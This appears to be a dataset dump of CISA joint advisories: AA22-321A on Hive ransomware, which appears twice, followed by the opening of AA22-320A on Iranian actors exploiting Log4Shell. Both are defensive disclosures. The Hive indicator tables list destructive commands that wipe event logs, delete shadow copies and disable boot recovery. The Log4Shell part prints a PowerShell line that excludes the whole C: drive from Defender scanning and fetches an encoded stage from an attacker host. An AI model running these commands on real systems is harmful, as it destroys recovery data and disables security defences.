As of November 2022, Hive ransomware actors have victimized over 1,300 companies worldwide, receiving approximately US$100 million in ransom payments, according to FBI information. Hive ransomware follows the ransomware-as-a-service (RaaS) model in which developers create, maintain, and update the malware, and affiliates conduct the ransomware attacks. From June 2021 through at least November 2022, threat actors have used Hive ransomware to target a wide range of businesses and critical infrastructure sectors, including Government Facilities, Communications, Critical Manufacturing, Information Technology, and especially Healthcare and Public Health (HPH).
The method of initial intrusion will depend on which affiliate targets the network. Hive actors have gained initial access to victim networks by using single factor logins via Remote Desktop Protocol (RDP), virtual private networks (VPNs), and other remote network connection protocols [T1133]. In some cases, Hive actors have bypassed multifactor authentication (MFA) and gained access to FortiOS servers by exploiting Common Vulnerabilities and Exposures (CVE) CVE-2020-12812. This vulnerability enables a malicious cyber actor to log in without a prompt for the user’s second authentication factor (FortiToken) when the actor changes the case of the username.
Hive actors have also gained initial access to victim networks by distributing phishing emails with malicious attachments [T1566.001] and by exploiting the following vulnerabilities against Microsoft Exchange servers [T1190]:

CVE-2021-31207 - Microsoft Exchange Server Security Feature Bypass Vulnerability
CVE-2021-34473 - Microsoft Exchange Server Remote Code Execution Vulnerability
CVE-2021-34523 - Microsoft Exchange Server Privilege Escalation Vulnerability

After gaining access, Hive ransomware attempts to evade detention by executing processes to:

Identify processes related to backups, antivirus/anti-spyware, and file copying and then terminating those processes to facilitate file encryption [T1562].
Stop the volume shadow copy services and remove all existing shadow copies via vssadmin on command line or via PowerShell [T1059] [T1490].
Delete Windows event logs, specifically the System, Security and Application logs [T1070].

Prior to encryption, Hive ransomware removes virus definitions and disables all portions of Windows Defender and other common antivirus programs in the system registry [T1112].
Hive actors exfiltrate data likely using a combination of Rclone and the cloud storage service Mega.nz [T1537]. In addition to its capabilities against the Microsoft Windows operating system, Hive ransomware has known variants for Linux, VMware ESXi, and FreeBSD.
During the encryption process, a file named *.key (previously *.key.*) is created in the root directory (C:\ or /root/). Required for decryption, this key file only exists on the machine where it was created and cannot be reproduced. The ransom note, HOW_TO_DECRYPT.txt is dropped into each affected directory and states the *.key file cannot be modified, renamed, or deleted, otherwise the encrypted files cannot be recovered [T1486]. The ransom note contains a “sales department” .onion link accessible through a TOR browser, enabling victim organizations to contact the actors through a live chat panel to discuss payment for their files. However, some victims reported receiving phone calls or emails from Hive actors directly to discuss payment.
The ransom note also threatens victims that a public disclosure or leak site accessible on the TOR site, “HiveLeaks”, contains data exfiltrated from victim organizations who do not pay the ransom demand (see figure 1 below). Additionally, Hive actors have used anonymous file sharing sites to disclose exfiltrated data (see table 1 below).



Figure 1: Sample Hive Ransom Note

 

Table 1: Anonymous File Sharing Sites Used to Disclose Data


https://anonfiles[.]com


https://mega[.]nz


https://send.exploit[.]in


https://ufile[.]io


https://www.sendspace[.]com


https://privatlab[.]net


https://privatlab[.]com



 
Once the victim organization contacts Hive actors on the live chat panel, Hive actors communicate the ransom amount and the payment deadline. Hive actors negotiate ransom demands in U.S. dollars, with initial amounts ranging from several thousand to millions of dollars. Hive actors demand payment in Bitcoin.
Hive actors have been known to reinfect—with either Hive ransomware or another ransomware variant—the networks of victim organizations who have restored their network without making a ransom payment.
Indicators of Compromise
Threat actors have leveraged the following IOCs during Hive ransomware compromises. Note: Some of these indicators are legitimate applications that Hive threat actors used to aid in further malicious exploitation. FBI, CISA, and HHS recommend removing any application not deemed necessary for day-to-day operations. See tables 2–3 below for IOCs obtained from FBI threat response investigations as recently as November 2022.

Table 2: Known IOCs as of November 2022


Known IOCs - Files


HOW_TO_DECRYPT.txt typically in directories with encrypted files


*.key typically in the root directory, i.e., C:\ or /root


hive.bat


shadow.bat


asq.r77vh0[.]pw - Server hosted malicious HTA file


asq.d6shiiwz[.]pw - Server referenced in malicious regsvr32 execution


asq.swhw71un[.]pw - Server hosted malicious HTA file


asd.s7610rir[.]pw - Server hosted malicious HTA file


Windows_x64_encrypt.dll


Windows_x64_encrypt.exe


Windows_x32_encrypt.dll


Windows_x32_encrypt.exe


Linux_encrypt


Esxi_encrypt


Known IOCs – Events


System, Security and Application Windows event logs wiped


Microsoft Windows Defender AntiSpyware Protection disabled


Microsoft Windows Defender AntiVirus Protection disabled


Volume shadow copies deleted


Normal boot process prevented


Known IOCs – Logged Processes


wevtutil.exe cl system


wevtutil.exe cl security


wevtutil.exe cl application


vssadmin.exe delete shadows /all /quiet


wmic.exe SHADOWCOPY /nointeractive


wmic.exe shadowcopy delete


bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures


bcdedit.exe /set {default} recoveryenabled no



 

Table 3: Potential IOC IP Addresses as of November 2022Note: Some of these observed IP addresses are more than a year old. FBI and CISA recommend vetting or investigating these IP addresses prior to taking forward-looking action like blocking.


Potential IOC IP Addresses for Compromise or Exfil:


84.32.188[.]57
84.32.188[.]238


93.115.26[.]251
185.8.105[.]67


181.231.81[.]239
185.8.105[.]112


186.111.136[.]37
192.53.123[.]202


158.69.36[.]149
46.166.161[.]123


108.62.118[.]190
46.166.161[.]93


185.247.71[.]106
46.166.162[.]125


5.61.37[.]207
46.166.162[.]96


185.8.105[.]103
46.166.169[.]34


5.199.162[.]220
93.115.25[.]139


5.199.162[.]229
93.115.27[.]148


89.147.109[.]208
83.97.20[.]81


5.61.37[.]207
5.199.162[.]220


5.199.162[.]229;
46.166.161[.]93


46.166.161[.]123;
46.166.162[.]96


46.166.162[.]125
46.166.169[.]34


83.97.20[.]81
84.32.188[.]238


84.32.188[.]57
89.147.109[.]208


93.115.25[.]139;
93.115.26[.]251


93.115.27[.]148
108.62.118[.]190


158.69.36[.]149/span>
181.231.81[.]239


185.8.105[.]67
185.8.105[.]103


185.8.105[.]112
185.247.71[.]106


186.111.136[.]37
192.53.123[.]202



 
MITRE ATT&CK TECHNIQUES
See table 4 for all referenced threat actor tactics and techniques listed in this advisory.

Table 4: Hive Actors ATT&CK Techniques for Enterprise


Initial Access


Technique Title
ID
Use


External Remote Services
T1133
Hive actors gain access to victim networks by using single factor logins via RDP, VPN, and other remote network connection protocols.


Exploit Public-Facing Application
T1190
Hive actors gain access to victim network by exploiting the following Microsoft Exchange vulnerabilities: CVE-2021-34473, CVE-2021-34523, CVE-2021-31207, CVE-2021-42321.


Phishing
T1566.001
Hive actors gain access to victim networks by distributing phishing emails with malicious attachments.


Execution


Technique Title
ID
Use


Command and Scripting Interpreter
T1059
Hive actors looks to stop the volume shadow copy services and remove all existing shadow copies via vssadmin on command line or PowerShell.


Defense Evasion


Technique Title
ID
Use


Indicator Removal on Host
T1070
Hive actors delete Windows event logs, specifically, the System, Security and Application logs.


Modify Registry
T1112
Hive actors set registry values for DisableAntiSpyware and DisableAntiVirus to 1.


Impair Defenses
T1562
Hive actors seek processes related to backups, antivirus/anti-spyware, and file copying and terminates those processes to facilitate file encryption.


Exfiltration


Technique Title
ID
Use


Transfer Data to Cloud Account
T1537
Hive actors exfiltrate data from victims, using a possible combination of Rclone and the cloud storage service Mega.nz.


Impact


Technique Title
 
Use


Data Encrypted for Impact
T1486
Hive actors deploy a ransom note HOW_TO_DECRYPT.txt into each affected directory which states the *.key file cannot be modified, renamed, or deleted, otherwise the encrypted files cannot be recovered.


Inhibit System Recovery
T1490
Hive actors looks to stop the volume shadow copy services and remove all existing shadow copies via vssadmin via command line or PowerShell.




Mitigations

FBI, CISA, and HHS recommend organizations, particularly in the HPH sector, implement the following to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Hive ransomware:

Verify Hive actors no longer have access to the network.
Install updates for operating systems, software, and firmware as soon as they are released. Prioritize patching VPN servers, remote access software, virtual machine software, and known exploited vulnerabilities. Consider leveraging a centralized patch management system to automate and expedite the process.
Require phishing-resistant MFA for as many services as possible—particularly for webmail, VPNs, accounts that access critical systems, and privileged accounts that manage backups.
If used, secure and monitor RDP.

Limit access to resources over internal networks, especially by restricting RDP and using virtual desktop infrastructure.
After assessing risks, if you deem RDP operationally necessary, restrict the originating sources and require MFA to mitigate credential theft and reuse.
If RDP must be available externally, use a VPN, virtual desktop infrastructure, or other means to authenticate and secure the connection before allowing RDP to connect to internal devices.
Monitor remote access/RDP logs, enforce account lockouts after a specified number of attempts to block brute force campaigns, log RDP login attempts, and disable unused remote access/RDP ports.
Be sure to properly configure devices and enable security features.
Disable ports and protocols not used for business purposes, such as RDP Port 3389/TCP.


Maintain offline backups of data, and regularly maintain backup and restoration. By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure. Ensure your backup data is not already infected.,
Monitor cyber threat reporting regarding the publication of compromised VPN login credentials and change passwords/settings if applicable.
Install and regularly update anti-virus or anti-malware software on all hosts.
Enable PowerShell Logging including module logging, script block logging and transcription.
Install an enhanced monitoring tool such as Sysmon from Microsoft for increased logging.
Review the following additional resources.

The joint advisory from Australia, Canada, New Zealand, the United Kingdom, and the United States on Technical Approaches to Uncovering and Remediating Malicious Activity provides additional guidance when hunting or investigating a network and common mistakes to avoid in incident handling.
The Cybersecurity and Infrastructure Security Agency-Multi-State Information Sharing & Analysis Center Joint Ransomware Guide covers additional best practices and ways to prevent, protect, and respond to a ransomware attack.
StopRansomware.gov is the U.S. Government’s official one-stop location for resources to tackle ransomware more effectively.



If your organization is impacted by a ransomware incident, FBI, CISA, and HHS recommend the following actions.

Isolate the infected system. Remove the infected system from all networks, and disable the computer’s wireless, Bluetooth, and any other potential networking capabilities. Ensure all shared and networked drives are disconnected.
Turn off other computers and devices. Power-off and segregate (i.e., remove from the network) the infected computer(s). Power-off and segregate any other computers or devices that share a network with the infected computer(s) that have not been fully encrypted by ransomware. If possible, collect and secure all infected and potentially infected computers and devices in a central location, making sure to clearly label any computers that have been encrypted. Powering-off and segregating infected computers and computers that have not been fully encrypted may allow for the recovery of partially encrypted files by specialists.
Secure your backups. Ensure that your backup data is offline and secure. If possible, scan your backup data with an antivirus program to check that it is free of malware.

In addition, FBI, CISA, and HHS urge all organizations to apply the following recommendations to prepare for, mitigate/prevent, and respond to ransomware incidents.
Preparing for Cyber Incidents

Review the security posture of third-party vendors and those interconnected with your organization. Ensure all connections between third-party vendors and outside software or hardware are monitored and reviewed for suspicious activity.
Implement listing policies for applications and remote access that only allow systems to execute known and permitted programs under an established security policy.
Document and monitor external remote connections. Organizations should document approved solutions for remote management and maintenance, and immediately investigate if an unapproved solution is installed on a workstation.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).

Identity and Access Management

Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute of Standards and Technology (NIST) standards for developing and managing password policies.

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length.
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords.
Implement multiple failed login attempt account lockouts.
Disable password “hints.”
Refrain from requiring password changes more frequently than once per year unless a password is known or suspected to be compromised.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege.
Implement time-based access for accounts set at the admin level and higher. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task. 

Protective Controls and Architecture

Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Install, regularly update, and enable real time detection for antivirus software on all hosts.

Vulnerability and Configuration Management

Consider adding an email banner to emails received from outside your organization.
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.
Ensure devices are properly configured and that security features are enabled. 
Restrict Server Message Block (SMB) Protocol within the network to only access necessary servers and remove or disable outdated versions of SMB (i.e., SMB version 1). Threat actors use SMB to propagate malware across organizations.

REFERENCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

INFORMATION REQUESTED
The FBI, CISA, and HHS do not encourage paying a ransom to criminal actors. Paying a ransom may embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Paying the ransom also does not guarantee that a victim’s files will be recovered. However, the FBI, CISA, and HHS understand that when businesses are faced with an inability to function, executives will evaluate all options to protect their shareholders, employees, and customers. Regardless of whether you or your organization decide to pay the ransom, the FBI, CISA, and HHS urge you to promptly report ransomware incidents to your local FBI field office, or to CISA at report@cisa.gov or 1-844-Say-CISA (1-844-729-2472). Doing so provides investigators with the critical information they need to track ransomware attackers, hold them accountable under US law, and prevent future attacks. 
The FBI may seek the following information that you determine you can legally share, including:

Recovered executable files
Live random access memory (RAM) capture
Images of infected systems
Malware samples
IP addresses identified as malicious or suspicious
Email addresses of the attackers
A copy of the ransom note
Ransom amount
Bitcoin wallets used by the attackers
Bitcoin wallets used to pay the ransom
Post-incident forensic reports

DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI, CISA, and HHS do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, or HHS.
 

Revisions

Initial Version: November 17, 2022






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1059', 'T1190', 'T1070', 'T1486', 'T1112', 'T1566.001', 'T1133', 'T1490', 'T1537', 'T1562'}","






Actions to Take Today to Mitigate Cyber Threats from Ransomware:




Prioritize remediating known exploited vulnerabilities.
Enable and enforce multifactor authentication with strong passwords.
Close unused ports and remove any application not deemed necessary for day-to-day operations.








Summary

Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Health and Human Services (HHS) are releasing this joint CSA to disseminate known Hive IOCs and TTPs identified through FBI investigations as recently as November 2022.
FBI, CISA, and HHS encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents. Victims of ransomware operations should report the incident to their local FBI field office or CISA.
Download the PDF version of this report: pdf, 852.9 kb.
For a downloadable copy of IOCs, see AA22-321A.stix (STIX, 43.6 kb).

Technical Details

Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 12. See MITRE ATT&CK for Enterprise for all referenced tactics and techniques.
As of November 2022, Hive ransomware actors have victimized over 1,300 companies worldwide, receiving approximately US$100 million in ransom payments, according to FBI information. Hive ransomware follows the ransomware-as-a-service (RaaS) model in which developers create, maintain, and update the malware, and affiliates conduct the ransomware attacks. From June 2021 through at least November 2022, threat actors have used Hive ransomware to target a wide range of businesses and critical infrastructure sectors, including Government Facilities, Communications, Critical Manufacturing, Information Technology, and especially Healthcare and Public Health (HPH).
The method of initial intrusion will depend on which affiliate targets the network. Hive actors have gained initial access to victim networks by using single factor logins via Remote Desktop Protocol (RDP), virtual private networks (VPNs), and other remote network connection protocols,. In some cases, Hive actors have bypassed multifactor authentication (MFA) and gained access to FortiOS servers by exploiting Common Vulnerabilities and Exposures (CVE) CVE-2020-12812. This vulnerability enables a malicious cyber actor to log in without a prompt for the user’s second authentication factor (FortiToken) when the actor changes the case of the username.
Hive actors have also gained initial access to victim networks by distributing phishing emails with malicious attachments, and by exploiting the following vulnerabilities against Microsoft Exchange servers,:

CVE-2021-31207 - Microsoft Exchange Server Security Feature Bypass Vulnerability
CVE-2021-34473 - Microsoft Exchange Server Remote Code Execution Vulnerability
CVE-2021-34523 - Microsoft Exchange Server Privilege Escalation Vulnerability

After gaining access, Hive ransomware attempts to evade detention by executing processes to:

Identify processes related to backups, antivirus/anti-spyware, and file copying and then terminating those processes to facilitate file encryption,.
Stop the volume shadow copy services and remove all existing shadow copies via vssadmin on command line or via PowerShell,.
Delete Windows event logs, specifically the System, Security and Application logs,.

Prior to encryption, Hive ransomware removes virus definitions and disables all portions of Windows Defender and other common antivirus programs in the system registry,.
Hive actors exfiltrate data likely using a combination of Rclone and the cloud storage service Mega.nz,. In addition to its capabilities against the Microsoft Windows operating system, Hive ransomware has known variants for Linux, VMware ESXi, and FreeBSD.
During the encryption process, a file named *.key (previously *.key.*) is created in the root directory (C:\ or /root/). Required for decryption, this key file only exists on the machine where it was created and cannot be reproduced. The ransom note, HOW_TO_DECRYPT.txt is dropped into each affected directory and states the *.key file cannot be modified, renamed, or deleted, otherwise the encrypted files cannot be recovered,. The ransom note contains a “sales department” .onion link accessible through a TOR browser, enabling victim organizations to contact the actors through a live chat panel to discuss payment for their files. However, some victims reported receiving phone calls or emails from Hive actors directly to discuss payment.
The ransom note also threatens victims that a public disclosure or leak site accessible on the TOR site, “HiveLeaks”, contains data exfiltrated from victim organizations who do not pay the ransom demand (see figure 1 below). Additionally, Hive actors have used anonymous file sharing sites to disclose exfiltrated data (see table 1 below).



Figure 1: Sample Hive Ransom Note

 

 
Once the victim organization contacts Hive actors on the live chat panel, Hive actors communicate the ransom amount and the payment deadline. Hive actors negotiate ransom demands in U.S. dollars, with initial amounts ranging from several thousand to millions of dollars. Hive actors demand payment in Bitcoin.
Hive actors have been known to reinfect—with either Hive ransomware or another ransomware variant—the networks of victim organizations who have restored their network without making a ransom payment.
Indicators of Compromise
Threat actors have leveraged the following IOCs during Hive ransomware compromises. Note: Some of these indicators are legitimate applications that Hive threat actors used to aid in further malicious exploitation. FBI, CISA, and HHS recommend removing any application not deemed necessary for day-to-day operations. See tables 2–3 below for IOCs obtained from FBI threat response investigations as recently as November 2022.

 

 
MITRE ATT&CK TECHNIQUES
See table 4 for all referenced threat actor tactics and techniques listed in this advisory.


Mitigations

FBI, CISA, and HHS recommend organizations, particularly in the HPH sector, implement the following to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Hive ransomware:

Verify Hive actors no longer have access to the network.
Install updates for operating systems, software, and firmware as soon as they are released. Prioritize patching VPN servers, remote access software, virtual machine software, and known exploited vulnerabilities. Consider leveraging a centralized patch management system to automate and expedite the process.
Require phishing-resistant MFA for as many services as possible—particularly for webmail, VPNs, accounts that access critical systems, and privileged accounts that manage backups.
If used, secure and monitor RDP.

Limit access to resources over internal networks, especially by restricting RDP and using virtual desktop infrastructure.
After assessing risks, if you deem RDP operationally necessary, restrict the originating sources and require MFA to mitigate credential theft and reuse.
If RDP must be available externally, use a VPN, virtual desktop infrastructure, or other means to authenticate and secure the connection before allowing RDP to connect to internal devices.
Monitor remote access/RDP logs, enforce account lockouts after a specified number of attempts to block brute force campaigns, log RDP login attempts, and disable unused remote access/RDP ports.
Be sure to properly configure devices and enable security features.
Disable ports and protocols not used for business purposes, such as RDP Port 3389/TCP.


Maintain offline backups of data, and regularly maintain backup and restoration. By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure. Ensure your backup data is not already infected.,
Monitor cyber threat reporting regarding the publication of compromised VPN login credentials and change passwords/settings if applicable.
Install and regularly update anti-virus or anti-malware software on all hosts.
Enable PowerShell Logging including module logging, script block logging and transcription.
Install an enhanced monitoring tool such as Sysmon from Microsoft for increased logging.
Review the following additional resources.

The joint advisory from Australia, Canada, New Zealand, the United Kingdom, and the United States on Technical Approaches to Uncovering and Remediating Malicious Activity provides additional guidance when hunting or investigating a network and common mistakes to avoid in incident handling.
The Cybersecurity and Infrastructure Security Agency-Multi-State Information Sharing & Analysis Center Joint Ransomware Guide covers additional best practices and ways to prevent, protect, and respond to a ransomware attack.
StopRansomware.gov is the U.S. Government’s official one-stop location for resources to tackle ransomware more effectively.



If your organization is impacted by a ransomware incident, FBI, CISA, and HHS recommend the following actions.

Isolate the infected system. Remove the infected system from all networks, and disable the computer’s wireless, Bluetooth, and any other potential networking capabilities. Ensure all shared and networked drives are disconnected.
Turn off other computers and devices. Power-off and segregate (i.e., remove from the network) the infected computer(s). Power-off and segregate any other computers or devices that share a network with the infected computer(s) that have not been fully encrypted by ransomware. If possible, collect and secure all infected and potentially infected computers and devices in a central location, making sure to clearly label any computers that have been encrypted. Powering-off and segregating infected computers and computers that have not been fully encrypted may allow for the recovery of partially encrypted files by specialists.
Secure your backups. Ensure that your backup data is offline and secure. If possible, scan your backup data with an antivirus program to check that it is free of malware.

In addition, FBI, CISA, and HHS urge all organizations to apply the following recommendations to prepare for, mitigate/prevent, and respond to ransomware incidents.
Preparing for Cyber Incidents

Review the security posture of third-party vendors and those interconnected with your organization. Ensure all connections between third-party vendors and outside software or hardware are monitored and reviewed for suspicious activity.
Implement listing policies for applications and remote access that only allow systems to execute known and permitted programs under an established security policy.
Document and monitor external remote connections. Organizations should document approved solutions for remote management and maintenance, and immediately investigate if an unapproved solution is installed on a workstation.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).

Identity and Access Management

Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute of Standards and Technology (NIST) standards for developing and managing password policies.

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length.
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords.
Implement multiple failed login attempt account lockouts.
Disable password “hints.”
Refrain from requiring password changes more frequently than once per year unless a password is known or suspected to be compromised.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege.
Implement time-based access for accounts set at the admin level and higher. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task. 

Protective Controls and Architecture

Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Install, regularly update, and enable real time detection for antivirus software on all hosts.

Vulnerability and Configuration Management

Consider adding an email banner to emails received from outside your organization.
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.
Ensure devices are properly configured and that security features are enabled. 
Restrict Server Message Block (SMB) Protocol within the network to only access necessary servers and remove or disable outdated versions of SMB (i.e., SMB version 1). Threat actors use SMB to propagate malware across organizations.

REFERENCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

INFORMATION REQUESTED
The FBI, CISA, and HHS do not encourage paying a ransom to criminal actors. Paying a ransom may embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Paying the ransom also does not guarantee that a victim’s files will be recovered. However, the FBI, CISA, and HHS understand that when businesses are faced with an inability to function, executives will evaluate all options to protect their shareholders, employees, and customers. Regardless of whether you or your organization decide to pay the ransom, the FBI, CISA, and HHS urge you to promptly report ransomware incidents to your local FBI field office, or to CISA at report@cisa.gov or 1-844-Say-CISA (1-844-729-2472). Doing so provides investigators with the critical information they need to track ransomware attackers, hold them accountable under US law, and prevent future attacks. 
The FBI may seek the following information that you determine you can legally share, including:

Recovered executable files
Live random access memory (RAM) capture
Images of infected systems
Malware samples
IP addresses identified as malicious or suspicious
Email addresses of the attackers
A copy of the ransom note
Ransom amount
Bitcoin wallets used by the attackers
Bitcoin wallets used to pay the ransom
Post-incident forensic reports

DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI, CISA, and HHS do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, or HHS.
 

Revisions

Initial Version: November 17, 2022






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-321a
37,"




Summary

From mid-June through mid-July 2022, CISA conducted an incident response engagement at a Federal Civilian Executive Branch (FCEB) organization where CISA observed suspected advanced persistent threat (APT) activity. In the course of incident response activities, CISA determined that cyber threat actors exploited the Log4Shell vulnerability in an unpatched VMware Horizon server, installed XMRig crypto mining software, moved laterally to the domain controller (DC), compromised credentials, and then implanted Ngrok reverse proxies on several hosts to maintain persistence. CISA and the Federal Bureau of Investigation (FBI) assess that the FCEB network was compromised by Iranian government-sponsored APT actors.
CISA and FBI are releasing this Cybersecurity Advisory (CSA) providing the suspected Iranian government-sponsored actors’ tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help network defenders detect and protect against related compromises.
CISA and FBI encourage all organizations with affected VMware systems that did not immediately apply available patches or workarounds to assume compromise and initiate threat hunting activities. If suspected initial access or compromise is detected based on IOCs or TTPs described in this CSA, CISA and FBI encourage organizations to assume lateral movement by threat actors, investigate connected systems (including the DC), and audit privileged accounts. All organizations, regardless of identified evidence of compromise, should apply the recommendations in the Mitigations section of this CSA to protect against similar malicious cyber activity.
For more information on Iranian government-sponsored Iranian malicious cyber activity, see CISA’s Iran Cyber Threat Overview and Advisories webpage and FBI’s Iran Threats webpage.
Download the PDF version of this report: pdf, 528 kb.
For a downloadable copy of the Malware Analysis Report (MAR) accompanying this report, see: MAR 10387061-1.v1.
For a downloadable copy of IOCs, see: AA22-320A.stix, 1.55 mb.

Technical Details

Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 11. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques with corresponding mitigation and/or detection recommendations.
Overview
In April 2022, CISA conducted retrospective analysis using EINSTEIN—an FCEB-wide intrusion detection system (IDS) operated and monitored by CISA—and identified suspected APT activity on an FCEB organization’s network. CISA observed bi-directional traffic between the network and a known malicious IP address associated with exploitation of the Log4Shell vulnerability (CVE-2021-44228) in VMware Horizon servers. In coordination with the FCEB organization, CISA initiated threat hunting incident response activities; however, prior to deploying an incident response team, CISA observed additional suspected APT activity. Specifically, CISA observed HTTPS activity from IP address 51.89.181[.]64 to the organization’s VMware server. Based on trusted third-party reporting, 51.89.181[.]64 is a Lightweight Directory Access Protocol (LDAP) server associated with threat actors exploiting Log4Shell. Following HTTPS activity, CISA observed a suspected LDAP callback on port 443 to this IP address. CISA also observed a DNS query for us‐nation‐ny[.]cf that resolved back to 51.89.181[.]64 when the victim server was returning this Log4Shell LDAP callback to the actors’ server.
CISA assessed that this traffic indicated a confirmed compromise based on the successful callback to the indicator and informed the organization of these findings; the organization investigated the activity and found signs of compromise. As trusted-third party reporting associated Log4Shell activity from 51.89.181[.]64 with lateral movement and targeting of DCs, CISA suspected the threat actors had moved laterally and compromised the organization’s DC.
From mid-June through mid-July 2022, CISA conducted an onsite incident response engagement and determined that the organization was compromised as early as February 2022, by likely Iranian government-sponsored APT actors who installed XMRig crypto mining software. The threat actors also moved laterally to the domain controller, compromised credentials, and implanted Ngrok reverse proxies.
Threat Actor Activity
In February 2022, the threat actors exploited Log4Shell [T1190] for initial access [TA0001] to the organization’s unpatched VMware Horizon server. As part of their initial exploitation, CISA observed a connection to known malicious IP address 182.54.217[.]2 lasting 17.6 seconds.
The actors’ exploit payload ran the following PowerShell command [T1059.001] that added an exclusion rule to Windows Defender [T1562.001]:
powershell try{Add-MpPreference -ExclusionPath 'C:\'; Write-Host 'added-exclusion'} catch {Write-Host 'adding-exclusion-failed' }; powershell -enc ""$BASE64 encoded payload to download next stage and execute it""
The exclusion rule allowlisted the entire c:\drive, enabling threat actors to download tools to the c:\drive without virus scans. The exploit payload then downloaded mdeploy.text from 182.54.217[.]2/mdepoy.txt to C:\users\public\mde.ps1 [T1105]. When executed, mde.ps1 downloaded file.zip from 182.54.217[.]2 and removed mde.ps1 from the disk [T1070.004].
